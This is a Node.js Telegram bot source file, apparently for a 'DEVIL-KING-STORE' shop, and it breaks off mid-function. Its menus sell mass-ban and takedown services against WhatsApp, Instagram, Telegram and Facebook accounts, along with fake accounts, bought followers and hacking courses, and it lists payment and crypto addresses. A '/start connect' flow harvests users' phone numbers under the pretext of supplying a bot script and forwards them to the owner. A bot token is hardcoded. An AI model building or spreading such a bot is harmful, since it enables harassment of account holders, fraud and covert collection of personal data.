const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const config = require('./config.json');
const getMenu = require('./menu');
const token = '8049686116:AAENwlPmhhw_VfsW2zFyOIz-Q33Uc1RoHFI';

const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });

let connectedSessions = [];
let premiumUsers = [];

// Load premium users from file
if (fs.existsSync('./premiumUsers.json')) {
    premiumUsers = JSON.parse(fs.readFileSync('./premiumUsers.json', 'utf-8'));
}

let owners = [config.OWNER_ID]; // define owners list




const GROUP_ID = "-1002777037316";   // Apna group ID
const CHANNEL_ID = "-1002978959423"; // Apna channel ID

// 🔎 Membership check function
async function checkMembership(userId) {
    try {
        const inGroup = await bot.getChatMember(GROUP_ID, userId);
        const inChannel = await bot.getChatMember(CHANNEL_ID, userId);

        return inGroup.status !== "left" && inChannel.status !== "left";
    } catch (err) {
        console.error("checkMembership error:", err);
        return false;
    }
}

// 🛡️ Verify Middleware (Start Command ke andar use hoga)
async function verifyUser(chatId, userId) {
    const isMember = await checkMembership(userId);

    if (!isMember) {
        return bot.sendPhoto(chatId, "./devil.jpg", {
            caption: "❌ *Access Denied!*\n\nYou must join, subscribe and follow all the *given links* to use this bot.",
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📲 WhatsApp", url: "https://whatsapp.com/channel/0029VbB3QKTK5cDO4aIvsq0W" }],
                    [{ text: "▶️ YouTube", url: "https://www.youtube.com/@DEVIL-KING-STORE" }],
                    [{ text: "📷 Instagram", url: "https://www.instagram.com/self__style__giirl?igsh=MXV1ZTMxdml0NG9lOQ==" }],
                    [{ text: "🔹 Telegram Group", url: "https://t.me/+JujsCUq4bLE0YWFl" }],
                    [{ text: "🔵 Telegram Channel", url: "https://t.me/+9O_GH8aI2CxlOTA1" }],
                    [{ text: "🔄 Check Again", callback_data: "check_membership" }]
                ]
            }
        });
    }

    return true; // agar member hai to allow karo
}

// 🚀 Start Command
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    const verified = await verifyUser(chatId, userId);

    if (verified === true) {
        bot.sendPhoto(chatId, "./devil.jpg", {
            caption: "✅ *Welcome!*\n\nYou have access to the bot /menu.",
            parse_mode: "Markdown"
        });
    }
});

// 🔄 Handle "Check Again"
bot.on("callback_query", async (query) => {
    const userId = query.from.id;
    const chatId = query.message.chat.id;

    if (query.data === "check_membership") {
        const isMember = await checkMembership(userId);

        bot.answerCallbackQuery(query.id, {
            text: isMember
                ? "✅ Verified! You can now use the bot."
                : "❌ You haven't completed the tasks yet!",
            show_alert: true,
        });

        if (isMember) {
            bot.sendMessage(chatId, "✅ Access Granted! Use /start again to open menu.");
        }
    }
});

////start command
bot.onText(/\/menu/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    let status = '';

    if (userId === config.OWNER_ID) {
        status = '💀MAIN OWNER💀';
    } else if (owners.includes(userId)) {
        status = '🌝OWNER🌝';
    } else if (premiumUsers.includes(userId)) {
        status = '💎PREMIUM💎';
    } else {
        status = '/buy';
    }

    const menu = getMenu(status);
    bot.sendPhoto(chatId, './devil.jpg', {
        caption: menu,
        parse_mode: 'Markdown'
    });
});

// /buy command
bot.onText(/\/buy/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, `📢 *𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐌𝐄𝐓𝐇𝐎𝐃*

╭━⊰ 💎 𝐔𝐏𝐈 💎 ⊱━╮
┃☞ 6001736850@axl
┃☞ 6001736850@ptsbi
┃☞ dmadhusudan4767@okhdfcbank
┃☞ 6001736850@fam
┃☞ /verify your payment
╰━━━━━━━━━━━━━━━━╯

╭━⊰ 💎 BINANCE 💎 ⊱━╮
┃☞ ID: 987442083
┃☞ /verify your payment
╰━━━━━━━━━━━━━━━━━━╯

╭━━━⊰ 💎 𝐂𝐑𝐘𝐏𝐓𝐎 💎 ⊱━━━╮
┃☞ BTC: bc1qrrwzdwz58qzphp
┃8aq5v07d2xve52r6kje3hvhf
┃☞ USDT: 0x98067f8111c39e72
┃d778e83f25b901de23b909a7
┃☞ ETH: 0x98067f8111c39e72d7
┃78e83f25b901de23b909a7
┃☞ SOL: GaA5hpKFHbhfuCbXWgr
┃h6tLxgEoTR6fSzbKpsVZJ2PAs
┃☞ TRX: TVYffqv8CyqB3YbDhx4
┃fFMP2zMXR9UoD2f
╰━━━━━━━━━━━━━━━━━━╯

☞ */verify* your payment to confirm.
`, { parse_mode: 'Markdown' });
});

// /verify command
bot.onText(/\/verify/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, `📢 *𝐕𝐄𝐑𝐈𝐅𝐘 𝐀𝐍𝐃 𝐂𝐋𝐀𝐈𝐌*

╭━━━━⊰ 💎 𝐕𝐄𝐑𝐈𝐅𝐘 💎 ⊱━━━━╮
┃☞ ᴘᴀʏᴍᴇɴᴛ ᴅᴏɴᴇ? ᴛʜᴇɴ ᴅᴍ:
┃☞ server1: @DEVILXKING002
┃☞ server2: @DEVILXKING006
╰━━━━━━━━━━━━━━━━━━━━╯
`, { parse_mode: 'Markdown' });
});

// /whatsapp command
bot.onText(/\/whatsapp/i, (msg) => {
    const chatId = msg.chat.id;

    const whatsappMenu = `👁️ *𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦* 👁️

╭━━━━⊰ 💎 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣💎 ⊱━━━━╮
┃☞ ᴡʜᴀᴛsᴀᴘᴘ sᴘᴀᴍ ʙᴀɴ      6$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ᴘᴇʀᴍ ʙᴀɴ      15$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ ʙᴀɴ     20$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴇɴɴᴇʟ ʙᴀɴ   20»
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ᴘᴇʀᴍᴀ ᴜɴʙᴀɴ   25$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴇɴɴᴇʟ ᴜɴʙᴀɴ 25»
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ ᴜᴍʙᴀɴ   20$
┃☞ ᴡᴘ ᴄʜᴇɴɴᴇʟ ʙᴀɴ ᴍᴇᴛʜᴏᴅ   50$
┃☞ ᴡᴘ ɢʀᴏᴜᴘ ʙᴀɴ ᴍᴇᴛʜᴏᴅ     20$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ʙᴀɴ ᴍᴇᴛʜᴏᴅ     25$
┃☞ ᴀʟʟ ʙᴀɴ ᴍᴇᴛʜᴏᴅ            70$ 
┃☞ ᴡᴘ ᴘᴇʀᴍᴀ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ  25$
┃☞ ᴡᴘ ᴄʜᴇɴɴᴇʟ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ 50$
┃☞ ᴡᴘ ɢʀᴏᴜᴘ ᴜᴍʙᴀɴ ᴍᴇᴛʜᴏᴅ  20$
┃☞ ᴀʟʟ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ          20$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ʙᴜɢ ʙᴏᴛ ғɪʟᴇ    10$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ᴛᴇᴍᴘ ɴᴜᴍʙᴇʀ    2$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ᴘᴇʀᴍᴀ ɴᴜᴍʙᴇʀ   5$
┃☞ ᴡʜᴀᴛsᴀᴘᴘ ᴘᴠᴛ ʙᴏᴛ ᴍᴇᴋɪɴɢ  10$
┃☞ /buy
╰━━━━━━━━━━━━━━━━━━━━━━━╯`;

    bot.sendPhoto(chatId, './devil.jpg', {
        caption: whatsappMenu,
        parse_mode: 'Markdown'
    });
});

// /instagram command
bot.onText(/\/instagram/i, (msg) => {
    const chatId = msg.chat.id;

    const whatsappMenu = `👁️ *𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦* 👁️

━━━━━⊰ 💎𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠💎 ⊱━━━━━━╮
┃☞ ɪɴsᴛᴀɢʀᴀᴍ ᴀᴄ sᴘᴀᴍ ʙᴀɴ          6$
┃☞ ɪɴsᴛᴀɢʀᴀᴍ ᴀᴄ ᴘᴇʀᴍᴀ ʙᴀɴ         15$
┃☞ ɪɴsᴛᴀɢʀᴀᴍ ʙᴀɴ ᴍᴇᴛʜᴏᴅ (ɴᴏ sᴜᴘ)  10$
┃☞ ɪɴsᴛᴀ ʙᴀɴ ᴍᴇᴛʜᴏᴅ ( ᴡɪᴛʜ sᴜᴘ)    35$
┃☞ ɪɴsᴛᴀ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ              20$
┃☞ ɪɴsᴛᴀ ғᴏʟʟᴏᴡ ᴘᴇʀ 1ᴋ              2$
┃☞ ɪɴsᴛᴀ ʟɪᴋᴇ ᴘᴇʀ 1ᴋ                 1$
┃☞ ɪɴsᴛᴀ ᴄᴏᴍᴍᴇɴᴛ ᴘᴇʀ 1ᴋ            3$
┃☞ /buy
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;

    bot.sendPhoto(chatId, './devil.jpg', {
        caption: whatsappMenu,
        parse_mode: 'Markdown'
    });
});

// /telegram command
bot.onText(/\/telegram/i, (msg) => {
    const chatId = msg.chat.id;

    const whatsappMenu = `👁️ *𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦* 👁️

╭╭━━━⊰ 💎 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠💎 ⊱━━━╮
┃☞ ᴛᴇʟᴇ ᴀᴄᴄᴜɴᴛ ʙᴀɴ       20$
┃☞ ᴛᴇʟᴇ ɢʀᴏᴜᴘ ʙᴀɴ        20$
┃☞ ᴛᴇʟᴇ ᴄʜᴇɴɴʟ ʙᴀɴ       20»
┃☞ ᴛᴇʟᴇ ᴀᴄᴄᴜɴᴛ ᴜɴʙᴀɴ    30$
┃☞ ᴛᴇʟᴇ ᴀᴄᴄᴜɴᴛ ᴜɴғʀᴇᴢᴢ  20$
┃☞ ᴛᴇʟᴇ ɢʀᴏᴜᴘ ᴜɴʙᴀɴ     20$
┃☞ ᴛᴇʟᴇ ᴄʜᴇɴɴʟ ᴜɴʙᴀɴ     20»
┃☞ ᴛᴇʟᴇ ᴀᴄ ʙᴀɴ ᴍᴇᴛʜᴏᴅ   20$
┃☞ ᴛᴇʟᴇ ɢᴄ ʙᴀɴ ᴍᴇᴛʜᴏᴅ   15$
┃☞ ᴛᴇʟᴇ ᴄɴʟ ʙᴀɴ ᴍᴇᴛʜᴏᴅ   30$
┃☞ ᴛᴇʟᴇ ʙᴀɴ ᴍᴇᴛʜᴏᴅ ᴀʟʟ   50$
┃☞ ᴛᴇʟᴇ ᴀᴄ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ  30$
┃☞ ᴛᴇʟᴇ ɢᴄ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ  25$
┃☞ ᴛᴇʟᴇ ᴄɴʟ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ  50$
┃☞ ᴛᴇʟᴇ ᴜɴʙᴀɴ ᴍᴇᴛʜᴏᴅ ᴀʟʟ  80$$
┃☞ ᴛᴇʟᴇ ғᴀᴋᴇ ᴀᴄᴄᴜɴᴛ         3$
┃☞ ᴛᴇʟᴇ ᴘʀɪᴠᴇᴛ ʙᴏᴛ ᴍᴇᴋɪɴɢ   10$
┃☞ /buy
╰━━━━━━━━━━━━━━━━━━━━━╯`;

    bot.sendPhoto(chatId, './devil.jpg', {
        caption: whatsappMenu,
        parse_mode: 'Markdown'
    });
});

// /hosting command
bot.onText(/\/hosting/i, (msg) => {
    const chatId = msg.chat.id;

    const whatsappMenu = `👁️ *𝗛𝗢𝗦𝗧𝗜𝗡𝗚 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦* 👁️

╭━━━⊰ 💎𝗛𝗢𝗦𝗧𝗜𝗡𝗚💎 ⊱━━━╮
┃☞ ᴠᴘs 16ɢʙ ʀᴇᴍ 30ᴅ    8$
┃☞ ᴜɴʟɪᴍᴇᴛᴇᴅ ᴘᴀɴᴇʟ 30ᴅ 2$
┃☞ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ 30ᴅ      6$
┃☞ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ 30ᴅ      8$
┃☞ ᴘᴀɴᴇʟ ɪɴsᴛᴇʟ ᴍᴇᴛʜᴏᴅ  15$
┃☞ ᴅᴏᴍɪɴ (xʏᴢ)    30ᴅ    5$
┃☞ /buy
╰━━━━━━━━━━━━━━━━━━━╯`;

    bot.sendPhoto(chatId, './devil.jpg', {
        caption: whatsappMenu,
        parse_mode: 'Markdown'
    });
});

// /facebook command
bot.onText(/\/facebook/i, (msg) => {
    const chatId = msg.chat.id;

    const whatsappMenu = `👁️ *𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦* 👁️

╭━━━━━⊰ 💎𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞💎 ⊱━━━━╮
┃☞ ғʙ ᴀᴄᴄᴏᴜɴᴛ ʙᴀɴ        20$
┃☞ ғʙ ᴘᴀɢᴇ ʙᴀɴ            20»
┃☞ ғʙ ᴘᴏsᴛ ᴅᴇʟᴀᴛᴇ         10$
┃☞ ғᴀᴄᴇ ʙᴏᴏᴋ ᴠɪᴅᴇᴏ ᴅᴇʟᴀᴛᴇ 10$
┃☞ ғᴀᴄᴇʙᴏᴏᴋ ɢʀᴏᴜᴘ ʙᴀɴ    10$
┃☞ ғʙ ᴀᴄᴄᴏᴜɴᴛ ᴜɴʙᴀɴ       30$
┃☞ ғʙ ᴘᴀɢᴇ ᴜɴʙᴀɴ           20»
┃☞ ғʙ ɢʀᴏᴜᴘ ᴜɴʙᴀɴ         20»
┃☞ /buy
╰━━━━━━━━━━━━━━━━━━━━━━━╯`;

    bot.sendPhoto(chatId, './devil.jpg', {
        caption: whatsappMenu,
        parse_mode: 'Markdown'
    });
});

// /others command
bot.onText(/\/others/i, (msg) => {
    const chatId = msg.chat.id;

    const whatsappMenu = `👁️ *𝗢𝗧𝗛𝗘𝗥𝗦 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦* 👁️

╭━━━⊰ 💎 𝗢𝗧𝗛𝗘𝗥𝗦 💎 ⊱━━━━╮
┃☞ ʙᴜɢ ʙᴏᴜɴᴛʏ            15$
┃☞ ʜᴀᴄᴋɪᴍɢ ᴄᴏʀsᴇs         20$
┃☞ /buy
╰━━━━━━━━━━━━━━━━━━━━━╯`;

    bot.sendPhoto(chatId, './devil.jpg', {
        caption: whatsappMenu,
        parse_mode: 'Markdown'
    });
});
// /ban command (must reply to user)
bot.onText(/^\/ban$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (!msg.reply_to_message) return bot.sendMessage(chatId, '❗️Reply to a user to ban them.', { reply_to_message_id: msg.message_id });

  const userId = msg.reply_to_message.from.id;

  try {
    await bot.banChatMember(chatId, userId); // updated method
    await bot.sendMessage(chatId, `🔨 User banned successfully.`, { reply_to_message_id: msg.message_id });
    console.log(`User ${userId} banned in ${chatId}`);
  } catch (error) {
    console.error('Ban error:', error.message);
    bot.sendMessage(chatId, `❌ Failed to ban: ${error.message}`, { reply_to_message_id: msg.message_id });
  }
});

// /unban command
bot.onText(/^\/unban$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (!msg.reply_to_message) return bot.sendMessage(chatId, '❗️Reply to the banned user to unban them.', { reply_to_message_id: msg.message_id });

  const userId = msg.reply_to_message.from.id;

  try {
    await bot.unbanChatMember(chatId, userId, { only_if_banned: true });
    await bot.sendMessage(chatId, `✅ User unbanned successfully.`, { reply_to_message_id: msg.message_id });
    console.log(`User ${userId} unbanned in ${chatId}`);
  } catch (error) {
    console.error('Unban error:', error.message);
    bot.sendMessage(chatId, `❌ Failed to unban: ${error.message}`, { reply_to_message_id: msg.message_id });
  }
});

// /mute command — user ko mute kare (reply zaroori hai)
bot.onText(/^\/mute$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, '❗️Please reply to the user you want to mute.', {
      reply_to_message_id: msg.message_id
    });
  }

  const userId = msg.reply_to_message.from.id;
  const userName = msg.reply_to_message.from.first_name;

  try {
    await bot.restrictChatMember(chatId, userId, {
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_other_messages: false,
      can_add_web_page_previews: false,
      until_date: 0,
    });

    await bot.sendMessage(chatId, `🔇 ${userName} has been muted.`, {
      reply_to_message_id: msg.message_id
    });

    console.log(`User ${userId} muted in chat ${chatId}`);
  } catch (err) {
    console.error('Mute error:', err.message);
    bot.sendMessage(chatId, `❌ Failed to mute: ${err.message}`, {
      reply_to_message_id: msg.message_id
    });
  }
});

// /unmute command — user ko unmute kare (reply zaroori hai)
bot.onText(/^\/unmute$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, '❗️Please reply to the user you want to unmute.', {
      reply_to_message_id: msg.message_id
    });
  }

  const userId = msg.reply_to_message.from.id;
  const userName = msg.reply_to_message.from.first_name;

  try {
    await bot.restrictChatMember(chatId, userId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
      until_date: 0,
    });

    await bot.sendMessage(chatId, `🔊 ${userName} has been unmuted.`, {
      reply_to_message_id: msg.message_id
    });

    console.log(`User ${userId} unmuted in chat ${chatId}`);
  } catch (err) {
    console.error('Unmute error:', err.message);
    bot.sendMessage(chatId, `❌ Failed to unmute: ${err.message}`, {
      reply_to_message_id: msg.message_id
    });
  }
});

bot.onText(/^\/info$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message) {
    // Reply nahi kiya to message bhej do
    return bot.sendMessage(chatId, '❗️ Please reply to a user\'s message to get info.', {
      reply_to_message_id: msg.message_id
    });
  }

  const user = msg.reply_to_message.from;
  const userInfo = `
🆔 ID: ${user.id}
👤 Name: ${user.first_name || ''} ${user.last_name || ''}
🔰 Username: @${user.username || 'N/A'}
🌐 Language: ${user.language_code || 'Unknown'}
🚫 Is Bot: ${user.is_bot ? 'Yes' : 'No'}
  `.trim();

  try {
    await bot.sendMessage(chatId, userInfo, { reply_to_message_id: msg.message_id });
  } catch (err) {
    console.error('Info command error:', err.message);
  }
});

bot.onText(/^\/kick$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, '❗️Please reply to the user you want to kick.', {
      reply_to_message_id: msg.message_id
    });
  }

  const userId = msg.reply_to_message.from.id;
  const userName = msg.reply_to_message.from.first_name;

  try {
    // Kick user (user can rejoin with invite)
    await bot.kickChatMember(chatId, userId);

    // Optional: Immediately unban so they can rejoin
    await bot.unbanChatMember(chatId, userId, { only_if_banned: true });

    await bot.sendMessage(chatId, `👢 ${userName} has been kicked from the group.`, {
      reply_to_message_id: msg.message_id
    });

    console.log(`User ${userId} kicked from chat ${chatId}`);
  } catch (error) {
    console.error('Kick error:', error.message);
    bot.sendMessage(chatId, `❌ Failed to kick: ${error.message}`, {
      reply_to_message_id: msg.message_id
    });
  }
});

bot.onText(/^\/add\s+@(\w+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1]; // Extracted username without @

  try {
    // 1. Group ka invite link generate karo
    const inviteLink = await bot.exportChatInviteLink(chatId);

    // 2. Message send karo with username and link
    await bot.sendMessage(chatId, `🔗 Invite for @${username}: ${inviteLink}`);
    
    console.log(`Generated invite for @${username}: ${inviteLink}`);
  } catch (err) {
    console.error('Add/invite error:', err.message);
  }
});

// /promote command
bot.onText(/^\/promote$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, '❗️Please reply to the user you want to promote.', {
      reply_to_message_id: msg.message_id
    });
  }

  const userId = msg.reply_to_message.from.id;
  const userName = msg.reply_to_message.from.first_name;

  try {
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: true,
      can_post_messages: true,
      can_edit_messages: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true,
      can_pin_messages: true,
      can_promote_members: false,
    });

    await bot.sendMessage(chatId, `🔼 ${userName} has been promoted to admin.`, {
      reply_to_message_id: msg.message_id
    });

    console.log(`User ${userId} promoted in chat ${chatId}`);
  } catch (err) {
    console.error('Promote error:', err.message);
    bot.sendMessage(chatId, `❌ Failed to promote: ${err.message}`, {
      reply_to_message_id: msg.message_id
    });
  }
});

// /demote command
bot.onText(/^\/demote$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, '❗️Please reply to the admin you want to demote.', {
      reply_to_message_id: msg.message_id
    });
  }

  const userId = msg.reply_to_message.from.id;
  const userName = msg.reply_to_message.from.first_name;

  try {
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_post_messages: false,
      can_edit_messages: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
      can_promote_members: false,
    });

    await bot.sendMessage(chatId, `🔽 ${userName} has been demoted from admin.`, {
      reply_to_message_id: msg.message_id
    });

    console.log(`User ${userId} demoted in chat ${chatId}`);
  } catch (err) {
    console.error('Demote error:', err.message);
    bot.sendMessage(chatId, `❌ Failed to demote: ${err.message}`, {
      reply_to_message_id: msg.message_id
    });
  }
});
let antiLinkEnabled = {}; // group-wise status tracker

// Helper to check if user is admin or owner
async function isUserAdmin(chatId, userId) {
  try {
    const admins = await bot.getChatAdministrators(chatId);
    return admins.some(admin => admin.user.id === userId);
  } catch {
    return false;
  }
}

// Helper to check if mentioned username is part of group
async function isMentionedUserInGroup(chatId, text) {
  const matches = text.match(/@(\w+)/g); // find @username
  if (!matches) return true; // koi mention nahi

  try {
    const members = await bot.getChatAdministrators(chatId); // faster check via admins
    const usernames = members.map(m => m.user.username?.toLowerCase()).filter(Boolean);
    return matches.every(tag => usernames.includes(tag.slice(1).toLowerCase()));
  } catch {
    return false;
  }
}

// ANTI-LINK ON
bot.onText(/^\/antilink on$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type === 'group' || msg.chat.type === 'supergroup') {
    antiLinkEnabled[chatId] = true;
    await bot.sendMessage(chatId, `✅ Antilink enabled successfully!`, {
      reply_to_message_id: msg.message_id
    });
    console.log(`Antilink ON in ${chatId}`);
  }
});

// ANTI-LINK OFF
bot.onText(/^\/antilink off$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type === 'group' || msg.chat.type === 'supergroup') {
    antiLinkEnabled[chatId] = false;
    await bot.sendMessage(chatId, `❎ Antilink disabled successfully!`, {
      reply_to_message_id: msg.message_id
    });
    console.log(`Antilink OFF in ${chatId}`);
  }
});

// LISTEN TO MESSAGES
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text || '';

  if (!antiLinkEnabled[chatId]) return;
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;
  if (await isUserAdmin(chatId, userId)) return;

  // link-like detection
  const linkRegex = /(https?:\/\/|t\.me\/|telegram\.me\/|www\.|\.com|\.net|\.org|\.in|\.co|\.io|:\/\/)/i;
  const hasLink = linkRegex.test(text);

  // check mention validity
  const hasInvalidMention = !(await isMentionedUserInGroup(chatId, text));

  if (hasLink || hasInvalidMention) {
    try {
      await bot.restrictChatMember(chatId, userId, {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        until_date: 0,
      });

      await bot.deleteMessage(chatId, msg.message_id);

      const userName = msg.from.username
        ? `@${msg.from.username}`
        : `${msg.from.first_name}`;

      await bot.sendMessage(chatId, `🔇 ${userName} muted ❌ Reason: Antilink`, {
        reply_to_message_id: msg.message_id
      });

      console.log(`User ${userId} muted for link in ${chatId}`);
    } catch (err) {
      console.error('Mute/Delete error:', err.message);
    }
  }
});


bot.onText(/^\/hi$/, async (msg) => {
  const chatId = msg.chat.id;

  // Sirf group ya supergroup me chale
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;

  // Agar reply nahi kiya to warning message bheje
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, '❗️Please reply to the user you want to connect.', {
      reply_to_message_id: msg.message_id
    });
  }

  // Inline button with correct bot username
  bot.sendMessage(chatId, '📞 FOR TYPE "HLW" OR TO CONNECT WITH DEVIL, CLICK HERE 👇:', {
    reply_markup: {
      inline_keyboard: [[{
        text: 'CLICK',
        url: `https://t.me/devilxtechstore_bot?start=connect`
      }]]
    },
    reply_to_message_id: msg.message_id
  });
});
const OWNER_ID = 7761115277; // <- Yaha @DEVILXKING006 ka Telegram numeric ID daalein

// Contact request message
bot.onText(/^\/start connect$/, (msg) => {
  bot.sendMessage(msg.chat.id, 'you need the bot script:', {
    reply_markup: {
      keyboard: [[{
        text: 'click',
        request_contact: true
      }]],
      one_time_keyboard: true,
      resize_keyboard: true
    }
  });
});

// Jab contact aata hai
bot.on('contact', (msg) => {
  const contact = msg.contact;
  const fromUser = msg.from;

  if (contact.user_id !== fromUser.id) {
    return bot.sendMessage(msg.chat.id, ' connact on devil for your bot.');
  }

  const number = contact.phone_number;
  const name = contact.first_name || '';
  const username = fromUser.username ? `@${fromUser.username}` : 'N/A';

  // Confirmation message to user
  bot.sendMessage(msg.chat.id, `✅ Thanks ${name}, your number is: ${number}`);

  // 🔁 Send number to bot owner
  bot.sendMessage(OWNER_ID, `
📥 *New Contact Shared*:
👤 *Name:* ${name}
📞 *Number:* ${number}
🆔 *User ID:* ${fromUser.id}
🔰 *Username:* ${username}
  `, { parse_mode: 'Markdown' });
});

// /groupmenu command
bot.onText(/\/groupmenu/i, (msg) => {
    const chatId = msg.chat.id;

    const whatsappMenu = `👁️ *𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦* 👁️

╭━━⊰ 💎𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨💎 ⊱━━╮
┃☞ ʙᴀɴ | ᴜɴʙᴀɴ
┃☞ ᴍᴜᴛᴇ | ᴜɴᴍᴜᴛᴇ
┃☞ ᴀɴᴛɪʟɪɴᴋ ᴏɴ | ᴏғғ
┃☞ ᴘʀᴏᴍᴏᴛᴇ | ᴅᴇᴍᴏᴛᴇ
┃☞ ɪɴғᴏ | ʜɪ
┃☞ ɢʀᴏᴜᴘ ᴏᴘᴇɴ | ᴄʟᴏsᴇ
┃☞ ᴋɪᴄᴋ | ᴀᴅᴅ
┃☞ ᴄʟᴇᴀʀᴄʜᴀᴛ ᴀʟʟ | ᴀᴍᴏᴜɴᴛ
┃☞ ᴛᴀɢᴀʟʟ | ᴛᴀɢᴀᴍɪɴ
┃☞ ᴀʙᴏᴜᴅᴇᴛᴇᴄᴛ ᴏɴ | ᴏғ
┃☞ ᴡᴇʟᴄᴏᴍᴇ ᴏɴ | ᴏғ
╰━━━━━━━━━━━━━━━━━━━━━╯`;

    bot.sendPhoto(chatId, './devil.jpg', {
        caption: whatsappMenu,
        parse_mode: 'Markdown'
    });
});

bot.onText(/^\/tagall$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;

  // Fetch all group members (Note: You must be admin and bot must have member access)
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const senderName = msg.from.first_name || "User";

    // Optional: Send start message
    await bot.sendMessage(chatId, `📢 *${senderName}* ɪɴɪᴛɪᴀᴛᴇᴅ ᴛᴀɢᴀʟʟ...\n\n🌀 ᴛᴀɢɢɪɴɢ ᴍᴇᴍʙᴇʀꜱ...`, {
      parse_mode: 'Markdown'
    });

    const members = await bot.getChatMembersCount(chatId);

    for (let i = 1; i <= members; i += 5) {
      let mentionChunk = "";

      for (let j = i; j < i + 5 && j <= members; j++) {
        mentionChunk += `👤 [Member${j}](tg://user?id=${j})\n`;
      }

      await bot.sendMessage(chatId, mentionChunk, { parse_mode: 'Markdown' });
      await new Promise(resolve => setTimeout(resolve, 1000)); // 1 sec delay
    }

    await bot.sendMessage(chatId, `✅ *ᴛᴀɢᴀʟʟ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!*`, {
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "❌ Failed to fetch members. Make sure bot is admin.");
  }
});

bot.onText(/^\/tagamin$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;

  try {
    const admins = await bot.getChatAdministrators(chatId);

